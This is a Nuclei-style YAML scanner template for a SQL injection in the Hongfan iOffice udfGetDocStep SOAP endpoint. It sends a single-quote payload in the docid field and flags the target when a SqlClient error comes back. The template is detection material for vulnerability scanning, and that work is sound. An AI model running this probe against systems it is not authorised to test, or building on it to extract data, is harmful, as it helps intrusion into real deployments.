红帆-ioffice-udfgetdocstep-sql注入.yaml

id: hongfan-ioffice-udfgetdocstep-sqli

info:
  name: hongfan-ioffice-udfgetdocstep-sqli
  author: hongfan-ioffice-udfgetdocstep-sqli
  severity: high

http:
  - raw:
      - |
        POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetDocStep"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetDocStep xmlns="http://tempuri.org/">
              <docid>1'</docid>
            </GetDocStep>
          </soap:Body>
        </soap:Envelope>     

    matchers:
      - type: dsl
        dsl:
          - "contains_all(body,'System.Data.SqlClient')"